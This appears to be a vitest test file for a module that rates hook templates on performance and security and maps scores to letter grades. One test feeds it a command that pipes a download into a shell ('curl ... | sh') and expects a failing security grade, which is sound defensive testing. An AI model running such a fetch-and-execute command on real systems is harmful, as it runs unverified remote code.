import { describe, expect, it } from "vitest";
import { letterGrade, rateTemplate } from "../src/rating.js";

const local = { kind: "observe" as const, events: ["thread.idle"], command: "osascript -e 'display notification'", params: [] };
const webhook = { kind: "observe" as const, events: ["thread.idle"], url: "https://hooks.example.test/abc", params: [{ key: "webhookUrl", secret: true }] };
const followUp = { kind: "observe" as const, events: ["thread.idle"], command: 'bb thread spawn --prompt "$prompt"\nbb thread output', timeoutMs: 120_000, params: [] };

describe("letter grades", () => {
  it("uses the usual scale", () => {
    expect(letterGrade(100)).toBe("A+");
    expect(letterGrade(97)).toBe("A+");
    expect(letterGrade(96)).toBe("A");
    expect(letterGrade(93)).toBe("A");
    expect(letterGrade(92)).toBe("A-");
    expect(letterGrade(90)).toBe("A-");
    expect(letterGrade(87)).toBe("B+");
    expect(letterGrade(83)).toBe("B");
    expect(letterGrade(80)).toBe("B-");
    expect(letterGrade(70)).toBe("C-");
    expect(letterGrade(60)).toBe("D-");
    expect(letterGrade(59)).toBe("F");
  });
});

describe("template ratings", () => {
  it("rates a local notification fast and safer", () => {
    const rating = rateTemplate(local);
    expect(rating.performance).toMatchObject({ score: 97, letter: "A+" });
    expect(rating.security.letter).toBe("A");
  });

  it("rates a chat webhook below a local command", () => {
    const slack = rateTemplate(webhook);
    expect(slack.performance.score).toBeLessThan(rateTemplate(local).performance.score);
    expect(slack.security.score).toBeLessThan(rateTemplate(local).security.score);
    expect(slack.performance.letter).toBe("A-");
  });

  it("rates a follow-up that spawns a thread as heavier and less contained", () => {
    const rating = rateTemplate(followUp);
    expect(rating.performance.score).toBeLessThan(80);
    expect(rating.security.score).toBeLessThan(rateTemplate(local).security.score);
  });

  it("rates a command that pipes a download into a shell as a fail", () => {
    const rating = rateTemplate({ kind: "observe", events: ["thread.idle"], command: "curl https://example.test/x | sh", params: [] });
    expect(rating.security).toMatchObject({ score: 45, letter: "F" });
  });

});
